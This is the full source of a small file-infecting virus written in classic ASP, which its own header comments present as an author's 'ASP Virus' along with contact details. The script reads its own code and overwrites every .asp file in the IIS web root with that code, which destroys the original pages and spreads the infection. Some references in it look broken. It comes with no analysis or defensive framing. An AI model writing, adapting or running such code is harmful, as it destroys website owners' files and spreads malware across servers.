<!--.:ASP.Fine:.-->
<!-- First sevenC's ASP Virus-->
<!-- http://sevenc.vze.com || sevenC_zone@yahoo.com -->
<%
Dim fso,Drives,Dropper,src,folder,subfolder,file,files
Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set Drives=fso.drives
Set dropper = Fso.opentextfile(Server.wscript.scriptfullname, 1)
src = dropper.readall
Set Folder=fso.getfolder("C:\InetPub\wwwRoot")
Set Files = folder.files 
For Each File in files
If fso.GetExtensionName(file.path)="asp" then
on error resume next
Set dropper = Fso.createtextfile(file.path, True)
dropper.write src
dropper.write(FileContents)
dropper.Close
end If 
Next
%>
